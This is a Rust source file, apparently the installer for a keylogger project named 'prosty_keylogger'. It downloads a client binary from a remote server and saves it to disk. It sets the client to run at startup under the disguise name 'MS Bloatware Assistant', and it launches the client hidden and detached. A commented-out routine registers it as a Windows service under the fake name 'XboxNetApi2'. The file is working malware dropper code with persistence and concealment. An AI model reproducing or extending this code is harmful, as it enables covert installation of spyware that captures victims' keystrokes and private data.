mod options;

use std::fs;
use std::path::{Path};
use reqwest::Url;
use std::os::windows::process::CommandExt;
use clap::Parser;
use log::{debug, error, info};
use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData};
use crate::options::Options;

async fn download_client(url: &Url) -> Result<Vec<u8>, anyhow::Error>{
    let web_client = reqwest::Client::new();
    let b= web_client.get(url.join("/client")?).send()
        .await?
        .bytes().await?;

    Ok(b.into())

}

fn download_and_save_client(url: &Url, dir: &Path, filename: &Path) -> Result<(), anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;
    let content = rt.block_on(async {
        let c = download_client(url).await?;
        return Ok::<Vec<u8>, anyhow::Error>(c)
    })?;
    let path = dir.join(filename);
    println!("{:?}", &dir);
    fs::create_dir_all(&dir)?;
    std::fs::write(path, content)?;
    Ok(())
}

/*
fn register_service(file_path: &Path) -> Result<(), anyhow::Error>{

    let f = file_path.as_os_str().to_str().unwrap();
    println!("{f}");
    let r_output = std::process::Command::new("cmd")
        .args(["/C", "sc.exe", "delete", "XboxNetApi2"])
        .output()?;
    println!("{:?}", r_output);
    let output = std::process::Command::new("cmd")
        .args(["/C", "sc.exe", "create","XboxNetApi2", &format!("binPath=\"{f}\"")])
        .output()?;

    println!("{:?}", output);
    Ok(())
}

 */

fn add_to_startup(file_path: &Path, server_address: &str, app_name: &str) -> Result<(), anyhow::Error>{
    //let exec_path = file_path.as_os_str().to_str().unwrap();
    //let mut arguments = String::with_capacity(80);
    //let arguments = format!("{}", server_address);
    let command = format!("{} {}", file_path.to_str().unwrap(), server_address);

    match std::process::Command::new("cmd")
        .args(["/C", "REG", "ADD", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "/V", app_name, "/t", "REG_SZ", "/F", "/D", &command])
        .output(){
        Ok(output) => {
            debug!("Registering {output:?}")
        }
        Err(e) => {
            info!("Process already registered: {e}")
        }
    }
    //info!()
    //println!("{:?}", output);
    Ok(())

}
fn spawn(file_path: &Path, server_address: &str) -> Result<(), anyhow::Error>{
    const DETACHED_PROCESS: u32 = 0x00000008;
    const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
    const CREATE_NO_WINDOW: u32 = 0x08000000;
    let flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW;

    if let Err(e) =  std::process::Command::new(file_path.as_os_str())
        .args([server_address])
        .creation_flags(flags)
        .spawn(){

        info!("Process is already running {e}")

    }


    //println!("{:?}", output);
    Ok(())
}

fn install_client(url: &Url, install_configuration: &InstallConfiguration) -> Result<(), anyhow::Error>{

    let dir = PathFragment::join_slice(&install_configuration.installation_base_path)?;

    let filename= &install_configuration.installation_file_name;
    let file_path = dir.join(&install_configuration.installation_file_name);
    //let home_drive = env::var("HOMEDRIVE")?;
    //let home_dir = env::var("HOMEPATH")?;
    //let dir = PathBuf::from_iter([&home_drive, &home_dir, "Documents/system/ptdd_x6"]);
    //let dir = PathFragment::join_slice(&task_configuration.installation_path)?;

    //println!("{:?}, {:?}, {:?}", &dir, &filename, &file_path);
    //let path = PathBuf::from(install_configuration.);
    download_and_save_client(url, &dir, filename)?;
    //register_service(&file_path)?;
    add_to_startup(&file_path, &install_configuration.server_url, "MS Bloatware Assistant")?;
    spawn(&file_path, &install_configuration.server_url)?;



    Ok(())
}

async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<InstallConfiguration, anyhow::Error>{
    let s = match personal_data{
        None => reqwest::get(url.to_owned()).await?.text().await?,
        Some(data) => {
            let client = reqwest::Client::new();
            client.post(url.join("/install")?).json(&data).send().await?.text().await?
        }
    };
    let t: InstallConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}
fn main()-> Result<(), anyhow::Error> {
    let rt = tokio::runtime::Runtime::new()?;
    let args = Options::parse();
    let personal_data = PersonalData{
        name: None,
        last_name: None,
        gender: None,
    };
    let  url = Url::parse(&args.server_address)?;
    let config = rt.block_on(async{
        //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
        let config = get_config(&url, Some(&personal_data)).await?;
        return Ok::<InstallConfiguration, anyhow::Error>(config);

    })?;


    let install_result = install_client(&url, &config);
    match install_result{
        Ok(()) => {
            info!("Installation finished");
        }
        Err(e) => {
            error!("Error during installation: {e}");
        }
    }
    Ok(())

}